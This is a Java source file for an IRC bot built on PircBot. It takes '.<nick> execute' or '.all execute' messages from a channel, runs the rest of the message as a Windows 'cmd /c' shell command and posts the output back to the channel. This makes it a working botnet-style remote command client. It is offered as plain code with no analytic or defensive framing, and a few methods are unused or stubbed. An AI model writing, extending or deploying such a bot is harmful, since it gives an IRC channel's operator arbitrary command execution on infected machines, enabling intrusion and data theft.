package client;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Scanner;

import org.jibble.pircbot.PircBot;



public class Client extends PircBot {
	private String nameSet;

	public Client(String name) {
		this.setName(name);

	}
	
	public String actualNick() {
		return "";//this.getNick().substring()
	}
	
	public static String execCmd(String cmd) throws java.io.IOException {
	    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec("cmd /c "+ cmd).getInputStream()).useDelimiter("\\A");
	    return s.hasNext() ? s.next() : "";
	}
	public void setVariableName(String nameSet) {
		this.nameSet = nameSet;
	}

	public void onMessage(String channel, String sender, String login, String hostname, String message) {
		if (message.charAt(0) == '.') {
			//System.out.println("command detected");
			message = message.substring(1, message.length());
			String[] words = message.split(" ");
			System.out.println("The following is the nick:" + this.getNick() );
			if (words.length > 0 && (words[0].equals(this.getNick()) || words[0].equals("all"))) {
				System.out.println("command directed to me");
				if (words.length > 2 && words[1].equals("execute")) {
					System.out.println("executing command");
					String command = message.substring(message.indexOf("execute") + 8, message.length());
					//ArrayList<String> output = new ArrayList<String>();
					try {
						String cmdOutput = execCmd(command);
						for(String b: cmdOutput.split("\n")) {
							sendMessage(channel, b);
						}
						
						
						//sendMessage(channel, execCmd(command));
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						sendMessage(channel, "Command failed.");
					}
	
				}

			}

		}

	}
	
	
	private void executeCommand(String command) {
	    try {
	        returnOutput(command);
	        Process process = Runtime.getRuntime().exec(command);
	        logOutput(process.getInputStream(), "");
	        logOutput(process.getErrorStream(), "Error: ");
	        process.waitFor();
	    } catch (Exception e) {
	        e.printStackTrace();
	    }
	}

	private void logOutput(InputStream inputStream, String prefix) {
	    new Thread(() -> {
	        Scanner scanner = new Scanner(inputStream, "UTF-8");
	        while (scanner.hasNextLine()) {
	            synchronized (this) {
	                returnOutput(prefix + scanner.nextLine());
	            }
	        }
	        scanner.close();
	    }).start();
	}

	private synchronized void returnOutput(String message) {
	    System.out.println(message);
	}
}
